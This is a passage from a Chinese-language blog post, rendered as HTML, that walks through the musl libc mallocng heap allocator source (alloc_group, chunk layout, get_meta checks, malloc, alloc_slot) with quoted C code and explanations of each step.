<code>unsigned char storage[]</code>：要分配出去的内存空间，chunk</p>
<h4 id="alloc_group">alloc_group</h4>
<p>首先获取一个 meta ，然后根据经验以及当前内存状态计算出需要申请的
<code>group</code> 中 chunk 的数量。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span> size = UNIT * size_classes[sc];</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>, cnt;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *p;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">m</span> =</span> alloc_meta();</span><br><span class="line"><span class="keyword">if</span> (!m) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> usage = ctx.usage_by_class[sc];</span><br><span class="line"><span class="type">size_t</span> pagesize = PGSZ;</span><br><span class="line"><span class="type">int</span> active_idx;</span><br><span class="line"><span class="keyword">if</span> (sc &lt; <span class="number">9</span>) &#123;</span><br><span class="line">    <span class="keyword">while</span> (i &lt; <span class="number">2</span> &amp;&amp; <span class="number">4</span> * small_cnt_tab[sc][i] &gt; usage)</span><br><span class="line">        i++;</span><br><span class="line">    cnt = small_cnt_tab[sc][i];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// lookup max number of slots fitting in power-of-two size</span></span><br><span class="line">    <span class="comment">// from a table, along with number of factors of two we</span></span><br><span class="line">    <span class="comment">// can divide out without a remainder or reaching 1.</span></span><br><span class="line">    cnt = med_cnt_tab[sc &amp; <span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// reduce cnt to avoid excessive eagar allocation.</span></span><br><span class="line">    <span class="keyword">while</span> (!(cnt &amp; <span class="number">1</span>) &amp;&amp; <span class="number">4</span> * cnt &gt; usage)</span><br><span class="line">        cnt &gt;&gt;= <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// data structures don&#x27;t support groups whose slot offsets</span></span><br><span class="line">    <span class="comment">// in units don&#x27;t fit in 16 bits.</span></span><br><span class="line">    <span class="keyword">while</span> (size * cnt &gt;= <span class="number">65536</span> * UNIT)</span><br><span class="line">        cnt &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// If we selected a count of 1 above but it&#x27;s not sufficient to use</span></span><br><span class="line"><span class="comment">// mmap, increase to 2. Then it might be; if not it will nest.</span></span><br><span class="line"><span class="keyword">if</span> (cnt == <span class="number">1</span> &amp;&amp; size * cnt + UNIT &lt;= pagesize / <span class="number">2</span>) cnt = <span class="number">2</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div> 之后分两种情况。</p>
<p>如果所需内存大于页大小的一半则采用 mmap 的方式获取内存，期间也会对
group 中 chunk 的数量进行调整。注意 <code>active_idx</code> 的初值为
<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>max</mi><mo>⁡</mo><mo stretchy="false">(</mo><mn>0</mn><mo separator="true">,</mo><mi>min</mi><mo>⁡</mo><mo stretchy="false">(</mo><mrow><mo fence="true">⌊</mo><mfrac><mrow><mtext>0x2000</mtext><mo>−</mo><mn>16</mn></mrow><mtext>size</mtext></mfrac><mo fence="true">⌋</mo></mrow><mo>−</mo><mn>1</mn><mo separator="true">,</mo><mtext>cnt</mtext><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\max(0,\min(\left \lfloor \frac{\text{0x2000}-16}{\text{size}} \right \rfloor-1 ,\text{cnt}-1))</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2em;vertical-align:-0.35em;"></span><span class="mop">max</span><span class="mopen">(</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop">min</span><span class="mopen">(</span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">⌊</span></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8451em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord text mtight"><span class="mord mtight">size</span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord text mtight"><span class="mord mtight">0x2000</span></span><span class="mbin mtight">−</span><span class="mord mtight">16</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">⌋</span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8389em;vertical-align:-0.1944em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord text"><span class="mord">cnt</span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">))</span></span></span></span> 。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// All choices of size*cnt are &quot;just below&quot; a power of two, so anything</span></span><br><span class="line"><span class="comment">// larger than half the page size should be allocated as whole pages.</span></span><br><span class="line"><span class="keyword">if</span> (size * cnt + UNIT &gt; pagesize / <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="comment">// check/update bounce counter to start/increase retention</span></span><br><span class="line">    <span class="comment">// of freed maps, and inhibit use of low-count, odd-size</span></span><br><span class="line">    <span class="comment">// small mappings and single-slot groups if activated.</span></span><br><span class="line">    <span class="type">int</span> nosmall = is_bouncing(sc);</span><br><span class="line">    account_bounce(sc);</span><br><span class="line">    step_seq();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// since the following count reduction opportunities have</span></span><br><span class="line">    <span class="comment">// an absolute memory usage cost, don&#x27;t overdo them. count</span></span><br><span class="line">    <span class="comment">// coarse usage as part of usage.</span></span><br><span class="line">    <span class="keyword">if</span> (!(sc &amp; <span class="number">1</span>) &amp;&amp; sc &lt; <span class="number">32</span>) usage += ctx.usage_by_class[sc + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// try to drop to a lower count if the one found above</span></span><br><span class="line">    <span class="comment">// increases usage by more than 25%. these reduced counts</span></span><br><span class="line">    <span class="comment">// roughly fill an integral number of pages, just not a</span></span><br><span class="line">    <span class="comment">// power of two, limiting amount of unusable space.</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">4</span> * cnt &gt; usage &amp;&amp; !nosmall) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="number">0</span>)</span><br><span class="line">            ;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ((sc &amp; <span class="number">3</span>) == <span class="number">1</span> &amp;&amp; size * cnt &gt; <span class="number">8</span> * pagesize)</span><br><span class="line">            cnt = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ((sc &amp; <span class="number">3</span>) == <span class="number">2</span> &amp;&amp; size * cnt &gt; <span class="number">4</span> * pagesize)</span><br><span class="line">            cnt = <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ((sc &amp; <span class="number">3</span>) == <span class="number">0</span> &amp;&amp; size * cnt &gt; <span class="number">8</span> * pagesize)</span><br><span class="line">            cnt = <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ((sc &amp; <span class="number">3</span>) == <span class="number">0</span> &amp;&amp; size * cnt &gt; <span class="number">2</span> * pagesize)</span><br><span class="line">            cnt = <span class="number">5</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">size_t</span> needed = size * cnt + UNIT;</span><br><span class="line">    needed += -needed &amp; (pagesize - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// produce an individually-mmapped allocation if usage is low,</span></span><br><span class="line">    <span class="comment">// bounce counter hasn&#x27;t triggered, and either it saves memory</span></span><br><span class="line">    <span class="comment">// or it avoids eagar slot allocation without wasting too much.</span></span><br><span class="line">    <span class="keyword">if</span> (!nosmall &amp;&amp; cnt &lt;= <span class="number">7</span>) &#123;</span><br><span class="line">        req += IB + UNIT;</span><br><span class="line">        req += -req &amp; (pagesize - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (req &lt; size + UNIT || (req &gt;= <span class="number">4</span> * pagesize &amp;&amp; <span class="number">2</span> * cnt &gt; usage)) &#123;</span><br><span class="line">            cnt = <span class="number">1</span>;</span><br><span class="line">            needed = req;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    p = mmap(<span class="number">0</span>, needed, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (p == MAP_FAILED) &#123;</span><br><span class="line">        free_meta(m);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    m-&gt;maplen = needed &gt;&gt; <span class="number">12</span>;</span><br><span class="line">    ctx.mmap_counter++;</span><br><span class="line">    active_idx = (<span class="number">4096</span> - UNIT) / size - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (active_idx &gt; cnt - <span class="number">1</span>) active_idx = cnt - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (active_idx &lt; <span class="number">0</span>) active_idx = <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></div>
如果所需内存不超过页大小的一半则在再申请一个所需大小的
chunk，然后在其中构造 <code>group</code>
。与正常申请不同的是这里直接调用 <code>alloc_slot</code> 获取 chunk
的下标，不过和正常申请实际是一样的。在申请的 chunk
的头部要打上标记（<code>p[-3] = (p[-3] &amp; 31) | (6 &lt;&lt; 5)</code>）。最后再将
<code>group</code> 中的每个 chunk 的 <code>p[-4]</code> 处置零。
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="type">int</span> j = size_to_class(UNIT + cnt * size - IB);</span><br><span class="line">    <span class="type">int</span> idx = alloc_slot(j, UNIT + cnt * size - IB);</span><br><span class="line">    <span class="keyword">if</span> (idx &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        free_meta(m);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">g</span> =</span> ctx.active[j];</span><br><span class="line">    p = enframe(g, idx, UNIT * size_classes[j] - IB, ctx.mmap_counter);</span><br><span class="line">    m-&gt;maplen = <span class="number">0</span>;</span><br><span class="line">    p[<span class="number">-3</span>] = (p[<span class="number">-3</span>] &amp; <span class="number">31</span>) | (<span class="number">6</span> &lt;&lt; <span class="number">5</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= cnt; i++)</span><br><span class="line">        p[UNIT + i * size - <span class="number">4</span>] = <span class="number">0</span>;</span><br><span class="line">    active_idx = cnt - <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> 最后更新 <code>meta</code> 和 <code>group</code>
的相关字段，从这里可以看到，有的 chunk 对应的 <code>freed_mask</code>
被置 1 ，这些 chunk 暂时参与不到内存分配中。最后将管理申请到的
<code>group</code> 的 <code>meta</code> 返回。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">ctx.usage_by_class[sc] += cnt;</span><br><span class="line">m-&gt;avail_mask = (<span class="number">2u</span> &lt;&lt; active_idx) - <span class="number">1</span>;</span><br><span class="line">m-&gt;freed_mask = (<span class="number">2u</span> &lt;&lt; (cnt - <span class="number">1</span>)) - <span class="number">1</span> - m-&gt;avail_mask;</span><br><span class="line">m-&gt;mem = (<span class="type">void</span> *) p;</span><br><span class="line">m-&gt;mem-&gt;meta = m;</span><br><span class="line">m-&gt;mem-&gt;active_idx = active_idx;</span><br><span class="line">m-&gt;last_idx = cnt - <span class="number">1</span>;</span><br><span class="line">m-&gt;freeable = <span class="number">1</span>;</span><br><span class="line">m-&gt;sizeclass = sc;</span><br><span class="line"><span class="keyword">return</span> m;</span><br></pre></td></tr></table></figure></div> ### chunk
musl heap 中的 chunk 没有具体定义，但是根据程序可以分析出 chunk
的结构：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">chunk</span> &#123;</span><br><span class="line">	<span class="type">uint32_t</span> offset_32;</span><br><span class="line">	<span class="type">uint8_t</span> use_32_offset;</span><br><span class="line">    <span class="type">uint8_t</span> inedx:<span class="number">5</span>;</span><br><span class="line">	<span class="type">uint8_t</span> flag:<span class="number">3</span>;</span><br><span class="line">	<span class="type">uint16_t</span> offset_16;</span><br><span class="line">	<span class="type">char</span> user_data[]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>由于一般 <code>offset_32</code> 不使用，因此 <code>chunk</code>
结构如下图所示。 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/22e90e1117987faad801124b877f3080.png"
                     
alt="在这里插入图片描述" 
                > - <code>offset_32</code> 和
<code>offset_16</code> 都表示 <code>chunk</code> 的
<code>user_data</code> 与所在 <code>group</code> 的 <code>storage</code>
之间的偏移除以 16 ，只不过一个用 32 比特存储一个用 16 比特存储。当申请的
<code>chunk</code> 为该 <code>chunk</code> 内部的一块空间则外部的
<code>chunk</code> 的 <code>offset</code> 为与内部 <code>chunk</code>
的偏移除以 16 。当 <code>chunk</code> 被 free 掉时 <code>offset</code>
被置 0 。 - <code>use_32_offset</code> 表示是否用 <code>offset_32</code>
存储偏移。 - <code>flag</code> 是 <code>chunk</code> 的标志位。当申请的
<code>chunk</code> 为该 <code>chunk</code> 内部的一块空间则外部的
<code>chunk</code> 的 <code>flag</code> 为 7 ， 当申请的
<code>chunk</code> 作为 <code>group</code> 时该 <code>chunk</code> 的
<code>flag</code> 为 6 。正常申请出的 chunk ，该值为
<code>reserved</code> ，其中 <code>reserved</code> 为
<code>user_data</code> 到 <code>chunk</code>
结束位置的距离减去用户申请的内存大小与 5 取 min 的结果。如果
<code>chunk</code> 被 free 掉则 <code>flag</code> 和 <code>index</code>
一并置为 0xFF 。 - <code>index</code> 表示该 <code>chunk</code> 在
<code>group</code> 中的下标。当申请的 <code>chunk</code> 为该
<code>chunk</code> 内部的一块空间则外部的 <code>chunk</code> 的
<code>index</code> 为 0 ，内部 <code>chunk</code> 的 <code>index</code>
为外部 <code>chunk</code> 在 <code>group</code> 中的下标。 ####
get_slot_index 获取 <code>chunk</code> 的 <code>index</code> 。
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">int</span> <span class="title function_">get_slot_index</span><span class="params">(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *p)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> p[<span class="number">-3</span>] &amp; <span class="number">31</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> #### get_nominal_size 获取 <code>chunk</code> 中
<code>user_data</code> 的大小 ，具体原理见下面对 <code>enframe</code> 和
<code>set_size</code> 函数的分析。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">size_t</span> <span class="title function_">get_nominal_size</span><span class="params">(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *p, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *end)</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> reserved = p[<span class="number">-3</span>] &gt;&gt; <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">if</span> (reserved &gt;= <span class="number">5</span>) &#123;</span><br><span class="line">        assert(reserved == <span class="number">5</span>);</span><br><span class="line">        reserved = *(<span class="type">const</span> <span class="type">uint32_t</span> *) (end - <span class="number">4</span>);</span><br><span class="line">        assert(reserved &gt;= <span class="number">5</span>);</span><br><span class="line">        assert(!end[<span class="number">-5</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    assert(reserved &lt;= end - p);</span><br><span class="line">    assert(!*(end - reserved));</span><br><span class="line">    <span class="comment">// also check the slot&#x27;s overflow byte</span></span><br><span class="line">    assert(!*end);</span><br><span class="line">    <span class="keyword">return</span> end - reserved - p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h4 id="get_meta">get_meta</h4>
<p>首先获取 <code>chunk</code> 的 <code>offset</code> 和
<code>index</code> ，然后根据 <code>offset</code> 得到
<code>chunk</code> 对应 <code>group</code> 的地址，之后根据
<code>group</code> 获得 <code>meta</code> 。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">assert(!((<span class="type">uintptr_t</span>) p &amp; <span class="number">15</span>));</span><br><span class="line"><span class="type">int</span> offset = *(<span class="type">const</span> <span class="type">uint16_t</span> *) (p - <span class="number">2</span>);</span><br><span class="line"><span class="type">int</span> index = get_slot_index(p);</span><br><span class="line"><span class="keyword">if</span> (p[<span class="number">-4</span>]) &#123;</span><br><span class="line">    assert(!offset);</span><br><span class="line">    offset = *(<span class="type">uint32_t</span> *) (p - <span class="number">8</span>);</span><br><span class="line">    assert(offset &gt; <span class="number">0xffff</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">base</span> =</span> (<span class="type">const</span> <span class="type">void</span> *) (p - UNIT * offset - UNIT);</span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">meta</span> =</span> base-&gt;meta;</span><br></pre></td></tr></table></figure></div> 之后对
<code>meta</code> 和 <code>chunk</code> 进行相关检查，防止伪造 chunk
。通过检查后返回得到的 <code>meta</code> 。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">assert(meta-&gt;mem == base);</span><br><span class="line">assert(index &lt;= meta-&gt;last_idx);</span><br><span class="line">assert(!(meta-&gt;avail_mask &amp; (<span class="number">1u</span> &lt;&lt; index)));</span><br><span class="line">assert(!(meta-&gt;freed_mask &amp; (<span class="number">1u</span> &lt;&lt; index)));</span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">area</span> =</span> (<span class="type">void</span> *) ((<span class="type">uintptr_t</span>) meta &amp; <span class="number">-4096</span>);</span><br><span class="line">assert(area-&gt;check == ctx.secret);</span><br><span class="line"><span class="keyword">if</span> (meta-&gt;sizeclass &lt; <span class="number">48</span>) &#123;</span><br><span class="line">    assert(offset &gt;= size_classes[meta-&gt;sizeclass] * index);</span><br><span class="line">    assert(offset &lt; size_classes[meta-&gt;sizeclass] * (index + <span class="number">1</span>));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    assert(meta-&gt;sizeclass == <span class="number">63</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (meta-&gt;maplen) &#123;</span><br><span class="line">    assert(offset &lt;= meta-&gt;maplen * <span class="number">4096UL</span> / UNIT - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> (<span class="keyword">struct</span> meta *) meta;</span><br></pre></td></tr></table></figure></div> ## 函数分析
### malloc 首先检查申请的内存是否溢出。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (size_overflows(n)) <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure></div>
如果申请的内存大于 131052 字节则采用直接 mmap 的方式申请。
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (n &gt;= MMAP_THRESHOLD) &#123;</span><br><span class="line">    <span class="type">size_t</span> needed = n + IB + UNIT;</span><br><span class="line">    <span class="type">void</span> *p = mmap(<span class="number">0</span>, needed, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (p == MAP_FAILED) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    wrlock();</span><br><span class="line">    step_seq();</span><br><span class="line">    g = alloc_meta();</span><br><span class="line">    <span class="keyword">if</span> (!g) &#123;</span><br><span class="line">        unlock();</span><br><span class="line">        munmap(p, needed);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    g-&gt;mem = p;</span><br><span class="line">    g-&gt;mem-&gt;meta = g;</span><br><span class="line">    g-&gt;last_idx = <span class="number">0</span>;</span><br><span class="line">    g-&gt;freeable = <span class="number">1</span>;</span><br><span class="line">    g-&gt;sizeclass = <span class="number">63</span>;</span><br><span class="line">    g-&gt;maplen = (needed + <span class="number">4095</span>) / <span class="number">4096</span>;</span><br><span class="line">    g-&gt;avail_mask = g-&gt;freed_mask = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// use a global counter to cycle offset in</span></span><br><span class="line">    <span class="comment">// individually-mmapped allocations.</span></span><br><span class="line">    ctx.mmap_counter++;</span><br><span class="line">    idx = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">goto</span> success;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> 否则先计算出申请的内存大小所在的组并取出对应组的 deque 中
<code>ctx.active[sc]</code> 指向的那个 <code>meta</code> 。
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">sc = size_to_class(n);</span><br><span class="line"></span><br><span class="line">rdlock();</span><br><span class="line">g = ctx.active[sc];</span><br></pre></td></tr></table></figure></div> 其中 <code>size_to_class</code> 定义如下： <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">int</span> <span class="title function_">size_to_class</span><span class="params">(<span class="type">size_t</span> n)</span> &#123;</span><br><span class="line">    n = (n + IB - <span class="number">1</span>) &gt;&gt; <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">if</span> (n &lt; <span class="number">10</span>) <span class="keyword">return</span> n;</span><br><span class="line">    n++;</span><br><span class="line">    <span class="type">int</span> i = (<span class="number">28</span> - a_clz_32(n)) * <span class="number">4</span> + <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">if</span> (n &gt; size_classes[i + <span class="number">1</span>]) i += <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> (n &gt; size_classes[i]) i++;</span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
该代码等价于下面的 C++ 代码，只不过根据数据特性进行了复杂度的优化。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line">std::<span class="built_in">lower_bound</span>(size_classes, size_classes + <span class="number">48</span>, (n + IB - <span class="number">1</span>) &gt;&gt; <span class="number">4</span>) - size_classes;</span><br></pre></td></tr></table></figure></div>
<p>对应组的 deque 为空则根据经验进行一些调整。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// use coarse size classes initially when there are not yet</span></span><br><span class="line"><span class="comment">// any groups of desired size. this allows counts of 2 or 3</span></span><br><span class="line"><span class="comment">// to be allocated at first rather than having to start with</span></span><br><span class="line"><span class="comment">// 7 or 5, the min counts for even size classes.</span></span><br><span class="line"><span class="keyword">if</span> (!g &amp;&amp; sc &gt;= <span class="number">4</span> &amp;&amp; sc &lt; <span class="number">32</span> &amp;&amp; sc != <span class="number">6</span> &amp;&amp; !(sc &amp; <span class="number">1</span>) &amp;&amp; !ctx.usage_by_class[sc]) &#123;</span><br><span class="line">    <span class="type">size_t</span> usage = ctx.usage_by_class[sc | <span class="number">1</span>];</span><br><span class="line">    <span class="comment">// if a new group may be allocated, count it toward</span></span><br><span class="line">    <span class="comment">// usage in deciding if we can use coarse class.</span></span><br><span class="line">    <span class="keyword">if</span> (!ctx.active[sc | <span class="number">1</span>] || (!ctx.active[sc | <span class="number">1</span>]-&gt;avail_mask &amp;&amp; !ctx.active[sc | <span class="number">1</span>]-&gt;freed_mask))</span><br><span class="line">        usage += <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">if</span> (usage &lt;= <span class="number">12</span>)</span><br><span class="line">        sc |= <span class="number">1</span>;</span><br><span class="line">    g = ctx.active[sc];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
之后从尝试在该 <code>meta</code> 中获取一个空闲 chunk
的下标，如果成功则更新 <code>avail_mask</code> 后直接跳转到
<code>success</code> 否则跳出循环。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    mask = g ? g-&gt;avail_mask : <span class="number">0</span>;</span><br><span class="line">    first = mask &amp; -mask;</span><br><span class="line">    <span class="keyword">if</span> (!first) <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> (RDLOCK_IS_EXCLUSIVE || !MT)</span><br><span class="line">        g-&gt;avail_mask = mask - first;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (a_cas(&amp;g-&gt;avail_mask, mask, mask - first) != mask)</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    idx = a_ctz_32(first);</span><br><span class="line">    <span class="keyword">goto</span> success;</span><br><span class="line">&#125;</span><br><span class="line">upgradelock();</span><br></pre></td></tr></table></figure></div> 如果
<code>meta</code> 没有空闲 chunk 则调用 <code>alloc_slot</code>
获取一个有空闲 chunk 的 <code>meta</code> 然后让 <code>ctx.active</code>
对应的 deque 头指向这个 <code>meta</code> 。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">idx = alloc_slot(sc, n);</span><br><span class="line"><span class="keyword">if</span> (idx &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    unlock();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">g = ctx.active[sc];</span><br></pre></td></tr></table></figure></div>
最后如果成功获取空闲 chunk 的下标则调用 <code>enframe</code> 函数将该
chunk 取出。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">success:</span><br><span class="line">    ctr = ctx.mmap_counter;</span><br><span class="line">    unlock();</span><br><span class="line">    <span class="keyword">return</span> enframe(g, idx, n, ctr);</span><br></pre></td></tr></table></figure></div> ### alloc_slot</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">alloc_slot</span><span class="params">(<span class="type">int</span> sc, <span class="type">size_t</span> req)</span> &#123;</span><br><span class="line">    <span class="type">uint32_t</span> first = try_avail(&amp;ctx.active[sc]);</span><br><span class="line">    <span class="keyword">if</span> (first) <span class="keyword">return</span> a_ctz_32(first);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">g</span> =</span> alloc_group(sc, req);</span><br><span class="line">    <span class="keyword">if</span> (!g) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    g-&gt;avail_mask--;</span><br><span class="line">    <span class="built_in">queue</span>(&amp;ctx.active[sc], g);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>首先调用 <code>try_avail</code> 获取一个有空闲 chunk 的
<code>meta</code> 然后让让 <code>ctx.active</code> 对应的 deque
头指向这个 <code>meta</code> ，否则调用 <code>alloc_group</code>
申请一个新的 <code>group</code> 并且将这个 <code>group</code> 对应的
<code>meta</code> 加入到 deque 中（此时 deque 中就这一个
<code>meta</code> 因此 <code>ctx.active</code> 对应的 deque 头指向这个
<code>meta</code> ）。 ### try_avail 首先如果 deque 为空则直接返回 0 。
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">m</span> =</span> *pm;</span><br><span class="line"><span class="type">uint32_t</span> first;</span><br><span class="line"><span class="keyword">if</span> (!m) <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure></div> 如果没有可用的 chunk 则尝试获取一个有可用 chunk 的
